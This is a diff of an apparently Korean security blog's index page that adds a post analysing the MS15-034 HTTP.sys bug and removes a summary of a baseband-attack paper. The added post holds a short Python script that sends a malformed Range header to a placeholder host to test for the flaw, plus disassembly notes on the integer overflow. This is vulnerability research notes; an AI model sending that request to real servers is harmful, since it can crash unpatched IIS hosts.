@@ -9,12 +9,23 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="CreateRemoteThread. Bypass Windows 7 Session Separation 을 정리. Opening the Victim Process Target 에 어태치할때&hellip; 1
+  <meta name="description" content="1
 2
 3
 4
 5
-HANDLE WINAPI OpenProcess( &hellip;">
+6
+7
+8
+9
+10
+11
+12
+13
+import socket
+target = &#39;www.babo.com&#39;
+port = 80 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -70,6 +81,118 @@ HANDLE WINAPI OpenProcess( &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/04/16/ms15-034-http-dot-sys/">MS15-034 HTTP.sys</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-04-16T16:09:37+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:09 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;www.babo.com&#39;</span>
+</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">port</span><span class="p">)</span> <span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: www.babo.com</span><span class="se">\r\n</span><span class="s">Range: bytes=0-18446744073709551615</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">resp</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="s">&quot;Range Not Satisfiable&quot;</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;Looks vulnerable.&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Errata Security Blog 에 따르면, GET request 가 static contents 에 들어가야만 <code>Range:</code> 가 처리되서 버그가 trigger 된다고 한다. <code>.asp</code> 같은 동적 contents 를 호출하면 trigger 할 수 없다는 이야기.</p>
+
+<p><a href="http://blog.beyondtrust.com/the-delicate-art-of-remote-checks-a-glance-into-ms15-034">The Delicate Art of Remote Checks - A Glance Into MS15-034</a> 를 읽어보니,</p>
+
+<ul>
+<li>bindiff 를 때리고</li>
+<li>similarity 를 보고 패치가 들어간 함수들을 찾아서,</li>
+<li>IDA Pro 로 보니, <code>_UlpParseRange@32</code> 의 caller 는 <code>_UlContentRangeHeaderHandler@20</code></li>
+<li>`kd> bp HTTP!urlparserange &ldquo;k;g&rdquo;</li>
+</ul>
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mo">0006</span><span class="n">ED31</span>    <span class="n">_UlpParseRange</span><span class="nd">@32</span>
+</span><span class='line'>
+</span><span class='line'><span class="mo">0006</span><span class="n">EEF9</span>    <span class="n">sub</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edi</span>
+</span><span class='line'><span class="mo">0006</span><span class="n">EEFB</span>    <span class="n">sbb</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">edx</span>
+</span><span class='line'><span class="mo">0006</span><span class="n">EEFD</span>    <span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
+</span><span class='line'><span class="mo">0006</span><span class="n">EF00</span>    <span class="n">adc</span>     <span class="n">ecx</span><span class="p">,</span> <span class="mi">0</span>
+</span><span class='line'><span class="mo">0006</span><span class="n">EF03</span>    <span class="n">mov</span>     <span class="n">ds</span><span class="p">:[</span><span class="n">esi</span><span class="p">],</span> <span class="n">eax</span>
+</span><span class='line'><span class="mo">0006</span><span class="n">EF05</span>    <span class="n">mov</span>     <span class="n">ds</span><span class="p">:[</span><span class="n">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">ecx</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>코드상으로 보면 <code>ecx:eax</code> 에서 <code>edx:edi</code> 를 subtract 하는 것이다. 즉 8 바이트 더하기/빼기 연산.
+하단부터 빼고, <code>sbb</code> 로 borrow 까지 쳐서 빼는 코드.
+그리고, 하단에 <code>+1</code> 을 하고, 상단에 <code>adc</code> 로 캐리까지 올려서 더해주기.</p>
+
+<p><code>Range: A-B</code> 에서 <code>B - A + 1</code> 을 구현하는 코드로 보인다.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
+</span><span class='line'><span class="il">18446744073709551615L</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>여기에 <code>B</code> 값에 <code>0xFFFFFFFFFFFFFFFF</code> 이 들어가면서 문제가 벌어지는 것 같은데.</p>
+
+<p>테스트해보는 김에 다음을 해봐야겠다.</p>
+
+<ol>
+<li>Visual C++ 에서 signed/unsigned 다양하게 <code>B - A + 1</code> 을 해본다. B 는 0xFFFFFFFFFFFFFFFF 를 넣어서.</li>
+<li>저 x86 인스트럭션을 가지고 그대로 테스트해본다.</li>
+</ol>
+
+
+<p>가장 좋은건 취약한 IIS 버전을 VM 에 올려서 kd 를 걸고 해보는 것인데, 나중에 해볼련다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -746,103 +869,6 @@ DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/03/04/baseband-attacks-remote-exploitation-of-memory-corruptions-in-cellular-protocol-stacks/">Baseband Attacks: Remote Exploitation of Memory Corruptions in Cellular Protocol Stacks</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-03-04T11:13:38+09:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:13 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Ralf-Philipp Weinmann 의 <a href="https://www.usenix.org/system/files/conference/woot12/woot12-final24.pdf">Baseband Attacks: Remote Exploitation of Memory Corruptions in Cellular Protocol Stacks</a> 을 읽고 정리한다.</p>
-
-<p>참고가 될 만한 다른 글들</p>
-
-<ul>
-<li><a href="http://www.mulliner.org/security/feed/random_tales_mobile_hacker.pdf">Random tales from a mobile phone hacker, Collin Mulliner, CanSecWest 2010</a></li>
-<li><a href="https://www.usenix.org/legacy/events/sec11/tech/full_papers/Mulliner.pdf">SMS of Death: from analyzing to attacking mobile phones on a large scale</a></li>
-<li><a href="http://www.mulliner.org/security/sms/feed/smsfuzz_26c3.pdf">Fuzzing the phone in your phone</a></li>
-<li><a href="http://www.crisalis-project.eu/sites/crisalis-project.eu/files/crisalis_deliverable-D5.3.pdf">D5.3 Report on automated vulnerability discovery techniques</a></li>
-<li><a href="http://berlin.ccc.de/~tobias/31c3-ss7-locate-track-manipulate.pdf">SS7: Locate. Track. Manipulate.</a></li>
-<li><a href="http://www.tu-berlin.de/fileadmin/fg214/Papers/femto_ndss12.pdf">Weaponizing Femtocells: The Effect of Rogue Devices on Mobile Telecommunication</a></li>
-</ul>
-
-
-<h4>Attack Scenario</h4>
-
-<ul>
-<li>타겟이 되는 MS 근처에 BTS (Base Transceiver Station) 을 설치한다.</li>
-<li>BTS 는 강한 signal 강도로 network 가 avail 하다고 계속 때린다.</li>
-<li>MS 가 가짜 BTS 에 연결된다.</li>
-</ul>
-
-
-<h4>GSM</h4>
-
-<ul>
-<li>3G Baseband 칩/스택을 파는 회사는 Qualcomm, Intel (formerly Infineon), Broadcom, Texas Instruments, ST-Ericsson, Renesas (formerly Nokia), Marvell, MediaTek, NVidia (formerly Icera), VIA Telecom, Spreadtrum, Samsung 정도</li>
-</ul>
-
-
-<h4>Previous Works</h4>
-
-<ul>
-<li>AT command fuzzing</li>
-<li>SMS 로 DoS 공격 - Mulliner, Golde &amp; Seifert</li>
-<li>SMS 로 RCE - BlackHat 2009 Miller &amp; Mulliner</li>
-</ul>
-
-
-<h4>GSM 스택</h4>
-
-<h4>Reverse-Engineering of the Firmware</h4>
-
-<ul>
-<li>GSM 스택 소스는 라이센스를 받아야 얻을 수 있다.</li>
-<li>Vitelcom TSM30 프로젝트 소스코드가 공개된 적이 있는데, 거기 Condat GSM 스택 소스가 있었다.</li>
-<li>iPhone 4 용 업데이트 이미지에서 a full baseband binary blob 을 unpack 한후에 IDA Pro 와 BinDiff 를 이용해 분석.</li>
-<li>unltrasn0w -</li>
-<li>wiki -</li>
-</ul>
-
-
-<h4>Classification of bugs found</h4>
-
-<ul>
-<li>Insufficient length checks</li>
-<li>Object/structure lifecycle issues</li>
-<li>Integer Overflows/underflows</li>
-<li>Memory information leaks</li>
-</ul>
-
-
-<h4>Examples of exploitable bugs found</h4>
-
-<ul>
-<li>Sending a longer TMSI (e.g. 128 bytes) caused the baseband stack of iPhones with Intel/Comneon to crash</li>
-<li>For authentication, the base station transmits a challenge to the handset. In GSM, this challenge is a 16 byte value called RAND. For UMTS, a so-called AUTN challenge is used - which is encoded as a variable length in IE, but in fact is specified to also be 16 bytes long.</li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/9">&larr; Older</a>
@@ -860,6 +886,10 @@ DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/01/15/tf-idf/">TF-IDF</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/01/13/android-hackers-handbook/">Android Hacker's Handbook</a>
       </li>
     
@@ -873,10 +903,6 @@ DLL 의 <code>DLL_PROCESS_ATTACH</code> 때 돌아가게 코드를 만들어 놓
     
       <li class="post">
         <a href="/blog/2016/01/11/sock-sendpage/">Sock_sendpage</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/12/23/on-the-juniper-backdoor/">On the Juniper Backdoor</a>
       </li>
     
   </ul>
